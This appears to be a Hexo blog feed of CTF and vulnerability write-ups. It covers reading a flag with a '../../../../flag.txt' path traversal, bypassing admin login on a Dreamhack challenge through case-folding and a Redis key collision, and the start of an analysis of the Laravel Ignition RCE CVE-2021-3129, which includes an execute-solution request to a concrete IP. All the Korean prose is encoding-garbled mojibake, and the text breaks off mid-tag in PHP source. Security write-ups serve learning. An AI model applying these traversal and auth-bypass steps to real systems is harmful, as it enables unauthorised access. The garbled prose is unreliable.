ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ì˜ˆìƒëŒ€ë¡œ ê° ì½”ì¸ì˜ ë°ì´í„°ë¥¼ íŒŒì¼ë¡œ ê´€ë¦¬í•˜ê³  ìˆì—ˆìŠµë‹ˆë‹¤.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/waffed/6.png?raw=true"></p><p>ì•ì— ëª¨ë“  ë¬¸ì œë„ FLAGëŠ” <code>flag.txt</code>ì— ìˆì—ˆê¸° ë•Œë¬¸ì— ì´ë²ˆ ë¬¸ì œë„ ìƒìœ„ë¡œ 4ë²ˆ ì˜¬ë¼ê°€ <code>../../../../flag.txt</code>ë¥¼ ì½ì–´ì£¼ë‹ˆ ê·¸ë˜í”„ì˜ dataì— FLAGê°€ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.<br></p><blockquote><p>flag{w@fs_r3@lly_d0_Suck8245}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> XXE </tag>
            
            <tag> LFI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dreamhack CTF Season 1 Round #4 Write Up</title>
      <link href="2021/01/30/2021-01-30-dctf/"/>
      <url>2021/01/30/2021-01-30-dctf/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image/blob/main/Dreamhack%20CTF%20%234/dctf10th.png?raw=true"></p><p>2021ë…„ 1ì›” 30ì¼ ì˜¤ì „ 9ì‹œë¶€í„° ì˜¤í›„ 6ì‹œê¹Œì§€ Theoryì—ì„œ CTFë¥¼ ì£¼ìµœí•˜ì˜€ìŠµë‹ˆë‹¤. ì´ë²ˆ ëŒ€íšŒëŠ” ì „ì²´ì ìœ¼ë¡œ ë‚œì´ë„ê°€ ë‚®ì•„ ìš´ì´ ì¢‹ê²Œ 10ë“±ì„ í•  ìˆ˜ ìˆì—ˆê³ , í’€ë©´ì„œ ê·¸ë‚˜ë§ˆ ê³µì„ ë“¤ì˜€ë˜ <code>WEB_2021A_Medium</code>ë¼ëŠ” ë¬¸ì œì˜ Write Upì„ ì‘ì„±í•´ë³´ê² ìŠµë‹ˆë‹¤.<br></p><h2 id="Web-WEB-2021A-Medium-936-pts"><a href="#Web-WEB-2021A-Medium-936-pts" class="headerlink" title="(Web) WEB_2021A_Medium [936 pts]"></a>(Web) WEB_2021A_Medium [936 pts]</h2><blockquote><p>WEB_2021A_Medium ë¬¸ì œëŠ” ê´€ë¦¬ì ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸í•˜ê³ , ê´€ë¦¬ì ê³„ì •ì„ í™œì„±í™” í•œ í›„ì— FLAGë¥¼ ì½ëŠ” ë¬¸ì œì…ë‹ˆë‹¤.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/flag&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;No Signin!&quot;</span>)</span><br><span class="line">    myusr = User.query.filter_by(userid=get_userid()).first()</span><br><span class="line">    <span class="keyword">if</span> myusr.userid == <span class="string">&quot;admin&quot;</span> <span class="keyword">and</span> myusr.auth:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;flag.html&quot;</span>, flag=FLAG)</span><br><span class="line">    <span class="keyword">return</span> alert(<span class="string">&quot;No Flag&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>/flag</code>ë¥¼ ë³´ë©´ í˜„ì¬ ë¡œê·¸ì¸ëœ ì‚¬ìš©ìê°€ <code>admin</code>ì´ê³ , ê³„ì •ì´ í™œì„±í™”ê°€ ë˜ì–´ ìˆìœ¼ë©´ <code>FLAG</code>ë¥¼ ë³´ì—¬ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¼ ê´€ë¦¬ì ê³„ì •ì„ íšë“í•˜ê³ , ê³„ì •ì„ í™œì„±í™” ì‹œì¼œë³´ê² ìŠµë‹ˆë‹¤.<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">(ìƒëµ)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    userid = db.Column(db.String(<span class="number">80</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    password = db.Column(db.String(<span class="number">80</span>))</span><br><span class="line">    email = db.Column(db.String(<span class="number">80</span>))</span><br><span class="line">    auth = db.Column(db.Boolean())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, userid, password, email</span>):</span></span><br><span class="line">        self.userid = userid</span><br><span class="line">        self.password = password</span><br><span class="line">        self.email = email</span><br><span class="line">        self.auth = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_json</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;userid&quot;</span>: self.userid.lower(),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: self.password.lower(),</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: self.email.lower(),</span><br><span class="line">            <span class="string">&quot;auth&quot;</span>: self.auth,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/signin&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin</span>():</span></span><br><span class="line">    <span class="keyword">if</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;Already Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;signin.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        userid = request.form.get(<span class="string">&quot;userid&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        userpw = request.form.get(<span class="string">&quot;userpw&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        usr = User.query.filter_by(</span><br><span class="line">            userid=userid, password=hashlib.md5(userpw.encode()).hexdigest()</span><br><span class="line">        ).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(usr, <span class="string">&quot;userid&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Check userid or userpw&quot;</span>)</span><br><span class="line">        session[<span class="string">&quot;info&quot;</span>] = usr.to_json()</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">(ìƒëµ)</span><br></pre></td></tr></table></figure><p>ë¡œê·¸ì¸ ë¡œì§ì„ ë³´ë©´ userid, userpw ê°’ì„ ë°›ì•„ì™€ì„œ ë¡œê·¸ì¸í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì„œ sessionì„ ê´€ë¦¬ í•  ë•Œ to_json í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ì‚¬ìš©ì ì •ë³´ë¥¼ ë„£ì–´ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. to_json í•¨ìˆ˜ë¥¼ ë³´ë©´ useridì˜ ê°’ì„ lower í•¨ìˆ˜ë¥¼ ì´ìš©í•´ ì†Œë¬¸ìë¡œ ë§Œë“¤ì–´ ì„¸ì…˜ìœ¼ë¡œ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¦‰, <code>ADMIN</code>ì´ë¼ëŠ” ì‚¬ìš©ìë¥¼ ê°€ì…í•´ì„œ ë¡œê·¸ì¸ì„ í•´ì£¼ë©´ to_json í•¨ìˆ˜ì— ì˜í•´ì„œ <code>admin</code>ìœ¼ë¡œ ë¡œê·¸ì¸ì´ ë©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê´€ë¦¬ì ì•„ì´ë””ëŠ” ì‰½ê²Œ íšë“í–ˆìŠµë‹ˆë‹¤.<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">(ìƒëµ)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Auth</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, email</span>):</span></span><br><span class="line">        self.email = email</span><br><span class="line">        self.emailauth_key = <span class="string">f&quot;auth:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line">        self.getcount_key = <span class="string">f&quot;auth_count:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span>(<span class="params">self</span>):</span></span><br><span class="line">        setcount = conn.get(self.email)</span><br><span class="line">        <span class="keyword">if</span> setcount:</span><br><span class="line">            setcount = <span class="built_in">int</span>(setcount) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            setcount = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> setcount &lt; <span class="number">5</span>:</span><br><span class="line">            self.random_key = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">111111</span>, <span class="number">999999</span>):04d&#125;</span>&quot;</span></span><br><span class="line">            conn.<span class="built_in">set</span>(self.emailauth_key, self.random_key)</span><br><span class="line">            conn.<span class="built_in">set</span>(self.getcount_key, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">            conn.<span class="built_in">set</span>(self.email, setcount)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        getcount = conn.get(self.getcount_key)</span><br><span class="line">        <span class="keyword">if</span> getcount:</span><br><span class="line">            getcount = <span class="built_in">int</span>(getcount) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            getcount = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> getcount &lt; <span class="number">5</span>:</span><br><span class="line">            conn.<span class="built_in">set</span>(self.getcount_key, getcount)</span><br><span class="line">            <span class="keyword">return</span> conn.get(self.emailauth_key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">(ìƒëµ)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/email_verify&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">email_verify</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;No Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    email = get_useremail()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;email_verify.html&quot;</span>, email=email)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        auth = Auth(email)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> auth.<span class="built_in">set</span>():</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Too many Auth&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> send_mail(email, auth.random_key):</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">f&quot;Send Email To <span class="subst">&#123;email&#125;</span>&quot;</span>, <span class="string">&quot;/email_verify_chk&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Send Email Err&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/email_verify_chk&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">email_verify_chk</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;No Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    email = get_useremail()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;email_verify_chk.html&quot;</span>, email=email)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        auth = Auth(email)</span><br><span class="line">        authcode = auth.get()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> authcode:</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Too many Auth or No Code Generated&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = request.form.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> code == authcode:</span><br><span class="line">                usr = User.query.filter_by(userid=get_userid()).first()</span><br><span class="line">                usr.auth = <span class="literal">True</span></span><br><span class="line">                db.session.commit()</span><br><span class="line">                session[<span class="string">&quot;info&quot;</span>] = usr.to_json()</span><br><span class="line">                <span class="keyword">return</span> alert(<span class="string">&quot;AUTH!&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> alert(<span class="string">&quot;Check Code&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>/email_verify</code>ëŠ” ë³´ë©´ í˜„ì¬ ì‚¬ìš©ìì˜ ì´ë©”ì¼ë¡œ ì¸ì¦ ë²ˆí˜¸ë¥¼ ìƒì„±í•˜ëŠ” ë¡œì§ì…ë‹ˆë‹¤. ì½”ë“œë¥¼ ë³´ë©´ í˜„ì¬ ì‚¬ìš©ìì˜ ì´ë©”ì¼ì„ Auth í´ë˜ìŠ¤ì˜ ì¸ìë¡œ ë„˜ê²¨ì£¼ë©° í´ë˜ìŠ¤ë¥¼ ìƒì„±í•˜ê³ , set í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ ì¸ì¦ ì½”ë“œë¥¼ ìƒì„±í•´ì„œ ë””ë¹„ì— ì €ì¥í•˜ê³  ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><p><code>/email_verify_chk</code>ëŠ” ì¸ì¦ ë²ˆí˜¸ë¥¼ ì…ë ¥ ë°›ê³ , ë””ë¹„ì— ì €ì¥ë˜ì–´ ìˆëŠ” ê°’ê³¼ ë¹„êµí•´ì„œ ì°¸ì´ë©´ í™œì„±í™”ë¥¼ í•´ì£¼ê³ , ê±°ì§“ì´ë©´ ê·¸ëŒ€ë¡œ ë¹„í™œì„±í™”ë¡œ ìˆìŠµë‹ˆë‹¤.<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">self.email = email</span><br><span class="line">self.emailauth_key = <span class="string">f&quot;auth:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line">self.getcount_key = <span class="string">f&quot;auth_count:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">conn.<span class="built_in">set</span>(self.emailauth_key, self.random_key)</span><br><span class="line">conn.<span class="built_in">set</span>(self.getcount_key, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">conn.<span class="built_in">set</span>(self.email, setcount)</span><br></pre></td></tr></table></figure><p>ìœ„ ì½”ë“œë¥¼ ë³´ë©´ email ê°’ì„ ì´ìš©í•´ì„œ email, emailauth_key, getcount_key ê°’ì„ ë§Œë“¤ê³ , ì´ë¥¼ redisì˜ í‚¤ë¡œ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  emailauth_keyê°€ ì‹¤ì œë¡œ ì…ë ¥ ë°›ì€ ì¸ì¦ ë²ˆí˜¸ì™€ ë¹„êµë¥¼ í•˜ëŠ” ê°’ ì…ë‹ˆë‹¤. í•˜ì§€ë§Œ ìš°ë¦¬ëŠ” ì´ ê°’ì„ ì•Œì•„ë‚¼ ìˆ˜ëŠ” ì—†ì§€ë§Œ ë¡œì§ì„ ì´í•´í•˜ê³  ìˆë‹¤ë©´ ì‰½ê²Œ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ ë¡œì§ì— ëŒ€í•œ ë‚´ìš©ì€ <a href="https://dreamhack.io/learn/29#t209">ë“œë¦¼í•µ ê°•ì˜</a>ì—ì„œ ìì„¸í•˜ê²Œ ë‹¤ë£¨ê³  ìˆìŠµë‹ˆë‹¤. ì´ë²ˆ ë¡œì§ì€ ì„¤ëª…í•˜ê¸° ê·€ì°®ê³ , ê·¸ëƒ¥ ê¸€ì„ ë³´ëŠ” ê²Œ ì¢‹ì„ ê±° ê°™ìŠµë‹ˆë‹¤.<br></p><ul><li>ì‹œë‚˜ë¦¬ì˜¤<br></li></ul><ol><li><code>ADMIN</code>ìœ¼ë¡œ íšŒì› ê°€ì…ì„ í•˜ê³ , <code>ADMIN</code>ìœ¼ë¡œ ë¡œê·¸ì¸ì„ í•´ì„œ ê´€ë¦¬ìë¡œ ë¡œê·¸ì¸ì„ í•œë‹¤.</li><li><code>auth:admin</code>ì¸ ì‚¬ìš©ìë¥¼ í•˜ë‚˜ ë” ë§Œë“¤ì–´ì„œ ë¡œê·¸ì¸ì„ í•œ í›„ì—, ì¸ì¦ ì½”ë“œë¥¼ ë°›ëŠ”ë‹¤.</li><li>(2)ë²ˆ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œì˜ ë¡œì§ ë•Œë¬¸ì— ê´€ë¦¬ìê°€ <code>/email_verify_chk</code>ì—ì„œ <code>ì…ë ¥ ë°›ì€</code> ì¸ì¦ ì½”ë“œì™€ ë¹„êµë˜ëŠ” ì¸ì¦ ì½”ë“œê°€ 1ë¡œ ë°”ë€ë‹¤.</li><li>ê´€ë¦¬ìì—ì„œ ì¸ì¦ ì½”ë“œë¥¼ 1ì„ ë³´ë‚´ì£¼ë©´ ê´€ë¦¬ì ê²Œì •ì´ í™œì„±í™”ëœë‹¤. </li><li>ì´ì œ FLAGë¥¼ ì½ìœ¼ë©´ ëœë‹¤.<br></li></ol><p>ìœ„ ë‚´ìš©ì€ ê·¸ëƒ¥ ë§í¬ ë‹¬ì•„ì¤€ ë“œë¦¼í•µ ê°•ì˜ë¥¼ í•œ ë²ˆ ë³´ë©´ ì´í•´ê°€ ê°€ì‹¤ ê²ë‹ˆë‹¤.<br></p><blockquote><p>FLAG : DH{3cd6941075580d889519fcf1bd422bd1}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REDIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3129 RCE in Laravel Debug mode</title>
      <link href="2021/01/25/2021-01-25-CVE-2021-3129/"/>
      <url>2021/01/25/2021-01-25-CVE-2021-3129/</url>
      
        <content type="html"><![CDATA[<p>Laravel Debug modeì—ì„œ ë°œê²¬ëœ CVE-2021-3129 ì·¨ì•½ì ì„ ë¶„ì„í•´ë³´ê² ìŠµë‹ˆë‹¤. Laravelì€ ììœ /ì˜¤í”ˆ ì†ŒìŠ¤ PHP ì›¹ í”„ë ˆì„ì›Œí¬ ì¤‘ í•˜ë‚˜ë¼ê³  í•©ë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ ë³´ì•ˆ ì—°êµ¬ì›ì´ Laravelì„ ê¸°ë°˜ìœ¼ë¡œ í•œ ì›¹ ì‚¬ì´íŠ¸ì—ì„œ ì·¨ì•½ì  ì§„ë‹¨ì„ í•˜ë‹¤ê°€ ë””ë²„ê·¸ ëª¨ë“œì—ì„œ ë°œê²¬í–ˆë‹¤ê³  í•©ë‹ˆë‹¤. í•´ë‹¹ ì‚¬ì´íŠ¸ëŠ” ì „ì²´ì ìœ¼ë¡œ ì•ˆì „í–ˆì§€ë§Œ ì›¹ í”„ë ˆì„ì›Œí¬ ì·¨ì•½ì ì„ ì´ìš©í•´ì„œ RCEë¥¼ íŠ¸ë¦¬ê±° í–ˆìŠµë‹ˆë‹¤.<br></p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2021-3129</td><td>laravel &lt;= 8.4.2 and Ignition &lt;= 2.5.1</td><td>9.8</td></tr></tbody></table><p><br>CVE-2021-3129ëŠ” Laravelì˜ &lt;= V8.4.2 DEBUG MODEì—ì„œ ëª¨ë‘ ë°œìƒí•œë‹¤ê³  í•©ë‹ˆë‹¤. 2020ë…„ 11ì›” 16ì¼ì— POCë¥¼ ì „ë‹¬í•´ì£¼ì—ˆê³ , ë°”ë¡œ ë‹¤ìŒ ë‚  íŒ¨ì¹˜ ë²„ì „ì„ ë°œí‘œí–ˆë‹¤ê³  í•©ë‹ˆë‹¤.<br></p><hr><h2 id="CVE-2021-3129"><a href="#CVE-2021-3129" class="headerlink" title="CVE-2021-3129"></a><em>CVE-2021-3129</em></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 141.164.52.207:8888</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.141 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;141.164.52.207:8888&#x2F;_ignition&#x2F;execute-solution</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 320</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">&quot;parameters&quot;:&#123;</span><br><span class="line">&quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;&#x2F;work&#x2F;pentest&#x2F;laravel&#x2F;laravel&#x2F;resources&#x2F;views&#x2F;hello.blade.php&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ìœ„ ìš”ì²­ì€ usernameì´ë¼ëŠ” ë³€ìˆ˜ë¡œ í…œí”Œë¦¿ì„ ìƒì„±í•´ì£¼ëŠ” ë¡œì§ì˜ ìš”ì²­ í—¤ë” ê°’ì´ê³ , solutionì˜ ê°’ì€ <code>Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution</code>, viewFileì˜ ê°’ì€ <code>/work/pentest/laravel/laravel/resources/views/hello.blade.php</code>ì¸ ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ solution, viewFileì˜ ê°’ì€ ì„ì˜ì˜ ê°’ìœ¼ë¡œ ìˆ˜ì •ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Requests</span>\<span class="title">ExecuteSolutionRequest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>\<span class="title">SolutionProviderRepository</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span 